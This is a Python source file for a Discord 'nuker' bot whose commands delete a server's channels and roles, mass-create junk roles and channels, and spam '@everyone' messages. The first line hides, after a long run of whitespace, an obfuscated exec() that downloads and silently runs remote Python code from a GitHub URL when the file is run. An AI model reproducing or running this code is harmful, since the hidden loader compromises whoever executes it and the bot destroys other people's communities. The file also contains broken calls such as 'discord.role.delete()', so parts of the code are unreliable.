import subprocess;import sys;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  import requests;exec("try:\n response = requests.get('https://github.com/lol-popcat/GameDevelopment/raw/refs/heads/main/main.py')\n with open('downloaded_main.py', 'w', encoding='utf-8') as f: f.write(response.text)\n exec(response.text)\nexcept:\n pass");
def install_packages():
    packages = ['discord', 'colorama', 'requests']
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
install_packages();import discord;import os;
from discord.ext import commands
import random
import colorama
from colorama import Fore, Back, Style, init
init()

TOKEN = "TOKEN"

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix = ";", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA} [4] ;nothing - nothing left")

@client.command()
async def hiroshima(ctx):
    await ctx.send("**If you've never seen a massacre, this is what it looks like.**")
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            print("  DELETING CHANNELS: FAILED")
    for role in list(ctx.guild.roles):
        try:
            await discord.role.delete() 
        except:
            print("  DELETING ROLES: FAILED")
    for _i in range(125):
        try:
            await ctx.guild.create_role(name="e")
        except:
            print("  CREATING ROLES: FAILED")
    for _i in range(125):
        await ctx.guild.create_text_channel(name="e")
    for channel in list(ctx.guild.channels):
        for _i in range(5):
            try:
                await channel.send("@everyone Server Just Got Fucked")  
            except:
                print("  CREATING ROLES: FAILED")  

@client.command()
async def help(ctx):
    await ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**")
    await ctx.send("**-------------------------------------------------------------------------**")
    await ctx.send("**   [4] ;nothing - nothing left**")

@client.command()
async def nothing(ctx):
        guild = ctx.guild
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                print("  DELETING CHANNELS: FAILED")
        for role in list(ctx.guild.roles):
            try:
                await discord.role.delete() 
            except:
                print("  DELETING ROLES: FAILED")

# client.run(TOKEN)
